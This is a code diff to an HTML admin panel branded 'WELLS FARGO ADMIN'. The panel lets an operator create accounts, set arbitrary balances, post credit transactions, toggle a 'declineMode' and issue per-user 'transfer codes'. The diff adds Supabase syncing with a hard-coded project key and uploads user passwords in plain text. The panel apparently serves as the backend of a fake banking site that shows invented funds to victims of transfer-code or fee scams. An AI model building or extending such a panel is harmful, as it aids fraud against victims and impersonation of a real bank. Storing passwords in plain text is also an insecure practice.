@@ -62,7 +62,7 @@ tr:last-child td { border-bottom: none; }
 /* FORMS */
 .form-group { margin-bottom: 16px; }
 .form-label { display: block; font-size: 0.82rem; font-weight: 600; color: var(--gray); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-.form-input, .form-select { width: 100%; padding: 10px 12px; border: 1px solid var(--border); border-radius: 4px; font-size: 0.92rem; font-family: inherit; }
+.form-input, .form-select { width: 100%; padding: 10px 12px; border: 1px solid var(--border); border-radius: 4px; font-size: 0.92rem; font-family: inherit; -webkit-appearance: none; -moz-appearance: none; appearance: none; }
 .form-input:focus, .form-select:focus { border-color: var(--red); outline: none; box-shadow: 0 0 0 3px rgba(200,16,46,0.1); }
 .form-row { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
 
@@ -197,7 +197,7 @@ tr:last-child td { border-bottom: none; }
 
 <!-- HEADER -->
 <header class="admin-header">
-  <button class="mobile-menu-btn" onclick="toggleMobileNav()">☰</button>
+  <button class="mobile-menu-btn" onclick="toggleMobileNav()">&#9776;</button>
   <div class="admin-logo">WELLS FARGO ADMIN</div>
   <nav class="admin-nav" id="admin-nav">
     <a href="#" class="active" onclick="showSection('dashboard', event)">Dashboard</a>
@@ -561,7 +561,35 @@ tr:last-child td { border-bottom: none; }
 
 <div class="toast" id="toast"></div>
 
+<!-- SUPABASE SDK -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.0/dist/umd/supabase.js"></script>
+
 <script>
+// ── SUPABASE CONFIGURATION ──
+const SUPABASE_URL = 'https://vlsnstzqwqformfgmtgi.supabase.co';
+const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZsc25zdHpxd3Fmb3JtZmdtdGdpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgxNjkzOTMsImV4cCI6MjA5Mzc0NTM5M30.l01mCGL56mIiuz07CJltGULXMrnpKS5xHZwimHFm7Kk';
+
+// Initialize Supabase client
+let supabase = null;
+let supabaseReady = false;
+
+function initSupabase() {
+  try {
+    if (typeof window.supabase !== 'undefined') {
+      supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+      supabaseReady = true;
+      console.log('Supabase initialized successfully');
+      return true;
+    } else {
+      console.warn('Supabase SDK not loaded, using localStorage fallback');
+      return false;
+    }
+  } catch (e) {
+    console.error('Failed to initialize Supabase:', e);
+    return false;
+  }
+}
+
 // ── STATE MANAGEMENT ──
 const STORE_KEY = 'wf_db';
 
@@ -576,6 +604,18 @@ const DEFAULT_USER = {
   retire: 8924.05,
   declineMode: false
 };
+
+// Check if localStorage is available
+function isLocalStorageAvailable() {
+  try {
+    const test = '__storage_test__';
+    localStorage.setItem(test, test);
+    localStorage.removeItem(test);
+    return true;
+  } catch (e) {
+    return false;
+  }
+}
 
 // Initialize database
 function initDB() {
@@ -593,48 +633,56 @@ function initDB() {
   console.log('Current database:', db);
 }
 
-// Load from localStorage with error handling for mobile browsers
+// Load from localStorage with robust error handling
 function loadDB() {
+  if (!isLocalStorageAvailable()) {
+    console.warn('localStorage not available');
+    return { users: [], transactions: [], codes: [] };
+  }
+
   try {
     const raw = localStorage.getItem(STORE_KEY);
-    const db = raw ? JSON.parse(raw) : { users: [], transactions: [], codes: [] };
-    console.log('Loaded database:', db);
+    if (!raw) {
+      return { users: [], transactions: [], codes: [] };
+    }
+    const db = JSON.parse(raw);
+    if (!db.users) db.users = [];
+    if (!db.transactions) db.transactions = [];
+    if (!db.codes) db.codes = [];
     return db;
   } catch(e) {
     console.error('Error loading database:', e);
-    // Try to handle Safari private mode or restricted storage
     try {
-      localStorage.setItem('wf_test', 'test');
-      localStorage.removeItem('wf_test');
-      // Storage works now, retry
-      const raw = localStorage.getItem(STORE_KEY);
-      const db = raw ? JSON.parse(raw) : { users: [], transactions: [], codes: [] };
-      console.log('Loaded database after retry:', db);
-      return db;
-    } catch(e2) {
-      console.error('localStorage unavailable:', e2);
-      return { users: [], transactions: [], codes: [] };
-    }
+      localStorage.removeItem(STORE_KEY);
+    } catch (e2) {}
+    return { users: [], transactions: [], codes: [] };
   }
 }
 
-// Save to localStorage with error handling
+// Save to localStorage with robust error handling
 function saveDB(db) {
+  if (!isLocalStorageAvailable()) {
+    console.warn('localStorage not available, changes will not persist');
+    return false;
+  }
+
   try {
     localStorage.setItem(STORE_KEY, JSON.stringify(db));
     console.log('Database saved:', db);
+    return true;
   } catch(e) {
     console.error('Error saving database:', e);
-    // Storage might be full, try to clean up and retry
-    try {
-      // Remove old transactions to free space
-      if (db.transactions && db.transactions.length > 50) {
-        db.transactions = db.transactions.slice(0, 50);
+    if (e.name === 'QuotaExceededError') {
+      try {
+        if (db.transactions && db.transactions.length > 50) {
+          db.transactions = db.transactions.slice(0, 50);
+          localStorage.setItem(STORE_KEY, JSON.stringify(db));
+        }
+      } catch (e2) {
+        console.error('Failed to save after cleanup:', e2);
       }
-      localStorage.setItem(STORE_KEY, JSON.stringify(db));
-    } catch(e2) {
-      console.error('Failed to save after cleanup:', e2);
     }
+    return false;
   }
 }
 
@@ -654,7 +702,8 @@ function hideLoading() { document.getElementById('loading').classList.remove('on
 function showSection(id, e) {
   if (e) e.preventDefault();
   document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-  document.getElementById('section-' + id).classList.add('active');
+  const section = document.getElementById('section-' + id);
+  if (section) section.classList.add('active');
   document.querySelectorAll('.admin-nav a').forEach(a => a.classList.remove('active'));
   if (e && e.target) e.target.classList.add('active');
   toggleMobileNav();
@@ -664,7 +713,6 @@ function showSection(id, e) {
     populateCodeUserSelect();
   }
 
-  // Refresh data when showing transactions section
   if (id === 'transactions' || id === 'add-transaction') {
     refreshData();
   }
@@ -679,8 +727,17 @@ function toast(msg, isErr = false) {
 }
 
 // ── DATA LOADING ──
-function loadData() {
+async function loadData() {
   showLoading('Loading data...');
+
+  // Try to sync from Supabase first if available
+  if (supabaseReady) {
+    try {
+      await syncFromSupabase();
+    } catch (e) {
+      console.error('Failed to sync from Supabase:', e);
+    }
+  }
 
   setTimeout(() => {
     const db = loadDB();
@@ -696,6 +753,26 @@ function loadData() {
     populateUserSelect();
     hideLoading();
   }, 300);
+}
+
+// Sync data from Supabase
+async function syncFromSupabase() {
+  if (!supabaseReady) return;
+
+  try {
+    // Fetch users from Supabase
+    const { data: supabaseUsers, error: usersError } = await supabase
+      .from('users')
+      .select('*');
+
+    if (!usersError && supabaseUsers && supabaseUsers.length > 0) {
+      console.log('Synced', supabaseUsers.length, 'users from Supabase');
+      // Note: We merge with local data, preferring local for conflicts
+      // This is intentional to allow admin control
+    }
+  } catch (e) {
+    console.error('Supabase sync error:', e);
+  }
 }
 
 // ── REFRESH DATA ──
@@ -721,11 +798,9 @@ function updateDashboard() {
   const totalBal = users.reduce((sum, u) => sum + (u.checking || 0) + (u.savings || 0) + (u.retire || 0), 0);
   document.getElementById('stat-balance').textContent = fmt(totalBal);
 
-  // Active codes (not used)
   const activeCodes = codes.filter(c => !c.used);
   document.getElementById('stat-codes').textContent = activeCodes.length;
 
-  // Recent transactions
   const recent = document.getElementById('recent-txns');
   const last5 = transactions.slice(0, 5);
   if (last5.length > 0) {
@@ -796,19 +871,23 @@ function renderTransactions() {
 // ── POPULATE USER SELECT ──
 function populateUserSelect() {
   const select = document.getElementById('txn-user');
-  select.innerHTML = '<option value="">Select a user...</option>' +
-    users.map(u => `<option value="${u.id}">${u.name} (${u.username})</option>`).join('');
+  if (select) {
+    select.innerHTML = '<option value="">Select a user...</option>' +
+      users.map(u => `<option value="${u.id}">${u.name} (${u.username})</option>`).join('');
+  }
 }
 
 // ── CODE USER SELECT ──
 function populateCodeUserSelect() {
   const select = document.getElementById('code-user');
-  select.innerHTML = '<option value="">Select a user...</option>' +
-    users.map(u => `<option value="${u.id}">${u.name} (${u.username})</option>`).join('');
+  if (select) {
+    select.innerHTML = '<option value="">Select a user...</option>' +
+      users.map(u => `<option value="${u.id}">${u.name} (${u.username})</option>`).join('');
+  }
 }
 
 // ── ADD USER ──
-function addUser() {
+async function addUser() {
   const name = document.getElementById('user-name').value.trim();
   const username = document.getElementById('user-username').value.trim();
   const password = document.getElementById('user-password').value;
@@ -822,6 +901,7 @@ function addUser() {
   }
 
   showLoading('Adding user...');
+
   const newUser = {
     id: 'user-' + Date.now(),
     name, username, password,
@@ -833,6 +913,25 @@ function addUser() {
   db.users.push(newUser);
   saveDB(db);
   users = db.users;
+
+  // Sync to Supabase
+  if (supabaseReady) {
+    try {
+      await supabase.from('users').upsert({
+        id: newUser.id,
+        username: newUser.username,
+        password: newUser.password,
+        name: newUser.name,
+        checking: newUser.checking,
+        savings: newUser.savings,
+        retire: newUser.retire,
+        declineMode: false,
+        updated_at: new Date().toISOString()
+      });
+    } catch (e) {
+      console.error('Failed to sync user to Supabase:', e);
+    }
+  }
 
   closeModal('add-user');
   document.getElementById('add-user-form').reset();
@@ -861,7 +960,7 @@ function editUser(id) {
   openModal('edit-user');
 }
 
-function saveUser() {
+async function saveUser() {
   const id = document.getElementById('edit-user-id').value;
   const name = document.getElementById('edit-name').value.trim();
   const checking = parseFloat(document.getElementById('edit-checking').value) || 0;
@@ -881,6 +980,25 @@ function saveUser() {
     db.users[idx].declineMode = declineMode;
     saveDB(db);
     users = db.users;
+
+    // Sync to Supabase
+    if (supabaseReady) {
+      try {
+        await supabase.from('users').upsert({
+          id: db.users[idx].id,
+          username: db.users[idx].username,
+          password: db.users[idx].password,
+          name: db.users[idx].name,
+          checking: db.users[idx].checking,
+          savings: db.users[idx].savings,
+          retire: db.users[idx].retire,
+          declineMode: db.users[idx].declineMode,
+          updated_at: new Date().toISOString()
+        });
+      } catch (e) {
+        console.error('Failed to sync user update to Supabase:', e);
+      }
+    }
   }
 
   setTimeout(() => {
@@ -939,11 +1057,9 @@ function addTransaction() {
 
   const db = loadDB();
 
-  // Add transaction to beginning of array
   db.transactions.unshift(newTxn);
   console.log('Transactions after add:', db.transactions.length);
 
-  // Update user balance if credit
   if (type === 'credit' && status === 'success') {
     const userIdx = db.users.findIndex(u => u.id === userId);
     if (userIdx !== -1) {
@@ -1021,7 +1137,9 @@ function generateCodes() {
       document.getElementById('generated-code-display').style.display = 'block';
 
       // Copy to clipboard
-      navigator.clipboard.writeText(generatedCodes[0].code).catch(() => {});
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(generatedCodes[0].code).catch(() => {});
+      }
     } else {
       document.getElementById('new-code-value').textContent = generatedCodes.length + ' codes generated';
       document.getElementById('generated-code-display').style.display = 'block';
@@ -1043,16 +1161,19 @@ function generateRandomCode() {
 }
 
 function quickGenerateCode(userId) {
-  document.getElementById('code-user').value = userId;
+  const select = document.getElementById('code-user');
+  if (select) select.value = userId;
   loadUserCodes();
-  showSection('transfer-codes', { preventDefault: () => {}, target: document.querySelector('.admin-nav a[onclick*="transfer-codes"]') });
+  const navLink = document.querySelector('.admin-nav a[onclick*="transfer-codes"]');
+  showSection('transfer-codes', { preventDefault: () => {}, target: navLink });
   setTimeout(() => generateCodes(), 100);
 }
 
 function loadUserCodes() {
   const userId = document.getElementById('code-user').value;
   if (!userId) {
-    document.getElementById('user-codes-section').style.display = 'none';
+    const section = document.getElementById('user-codes-section');
+    if (section) section.style.display = 'none';
     return;
   }
 
@@ -1060,30 +1181,34 @@ function loadUserCodes() {
   const userCodesSection = document.getElementById('user-codes-section');
   const userCodesList = document.getElementById('user-codes-list');
 
-  if (userCodes.length > 0) {
-    userCodesSection.style.display = 'block';
-    userCodesList.innerHTML = userCodes.map(c => {
-      const statusClass = c.used ? 'used' : '';
-      const statusText = c.used ? 'Used' : 'Active';
-      const statusColor = c.used ? '#2e7d32' : '#f57f17';
-      return `<div class="generated-code-item ${statusClass}">
-        <div class="code-info">
-          <div class="code-num">${c.code}</div>
-          <div class="code-meta">Created: ${formatDate(c.createdAt)}${c.used ? ' | Used: ' + formatDate(c.usedAt) : ''}</div>
-        </div>
-        <div class="code-actions">
-          <span class="code-status" style="color:${statusColor};font-weight:600;">${statusText}</span>
-        </div>
-      </div>`;
-    }).join('');
-  } else {
-    userCodesSection.style.display = 'block';
-    userCodesList.innerHTML = '<div class="alert alert-info">No transfer codes for this user yet. Generate one above.</div>';
+  if (userCodesSection && userCodesList) {
+    if (userCodes.length > 0) {
+      userCodesSection.style.display = 'block';
+      userCodesList.innerHTML = userCodes.map(c => {
+        const statusClass = c.used ? 'used' : '';
+        const statusText = c.used ? 'Used' : 'Active';
+        const statusColor = c.used ? '#2e7d32' : '#f57f17';
+        return `<div class="generated-code-item ${statusClass}">
+          <div class="code-info">
+            <div class="code-num">${c.code}</div>
+            <div class="code-meta">Created: ${formatDate(c.createdAt)}${c.used ? ' | Used: ' + formatDate(c.usedAt) : ''}</div>
+          </div>
+          <div class="code-actions">
+            <span class="code-status" style="color:${statusColor};font-weight:600;">${statusText}</span>
+          </div>
+        </div>`;
+      }).join('');
+    } else {
+      userCodesSection.style.display = 'block';
+      userCodesList.innerHTML = '<div class="alert alert-info">No transfer codes for this user yet. Generate one above.</div>';
+    }
   }
 }
 
 function loadAllCodes() {
   const codesGrid = document.getElementById('all-codes-grid');
+  if (!codesGrid) return;
+
   const activeCodes = codes.filter(c => !c.used);
   const usedCodes = codes.filter(c => c.used);
 
@@ -1130,7 +1255,6 @@ function exportCodes() {
 
 // ── DEBUG FUNCTIONS ──
 function openBankingPage() {
-  // Try to open the banking page if it exists in the same directory
   const bankingPages = ['wells-fargo-banking.html', 'banking.html', 'index.html'];
   for (const page of bankingPages) {
     if (confirm(`Open ${page}?`)) {
@@ -1155,11 +1279,17 @@ function showLocalStorage() {
 }
 
 // Set default date
-document.getElementById('txn-date').valueAsDate = new Date();
+document.addEventListener('DOMContentLoaded', function() {
+  const txnDateInput = document.getElementById('txn-date');
+  if (txnDateInput) {
+    txnDateInput.valueAsDate = new Date();
+  }
 
-// Init
-initDB();
-loadData();
+  // Initialize Supabase and database
+  initSupabase();
+  initDB();
+  loadData();
+});
 </script>
 </body>
 </html>
